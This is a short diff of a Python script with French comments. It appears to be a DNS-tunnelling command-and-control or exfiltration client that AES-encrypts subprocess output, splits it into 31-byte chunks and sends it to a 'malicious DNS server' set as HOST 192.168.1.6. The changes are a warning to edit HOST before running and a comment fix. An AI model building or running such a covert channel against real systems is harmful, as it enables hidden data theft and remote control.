@@ -4,6 +4,7 @@ import base64
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 
+# # /!\ MODIFIER @ HOST AVANT D'EXECUTER LE PROGRAMME
 # Adresse et port du serveur DNS malicieux
 # 192.168.1.6:53
 HOST = '192.168.1.6'
@@ -23,7 +24,7 @@ def decrypt_aes_cbc(key, iv, ciphertext):
     return unpad(decrypted_data, AES.block_size).decode()
 
 # division des données retournées par subprocess
-# en bloc de 45 octets, rassemblés dans un tableau
+# en bloc de 31 octets, rassemblés dans un tableau
 def chunk(data):
     chunk_size = 31
     chunks = []
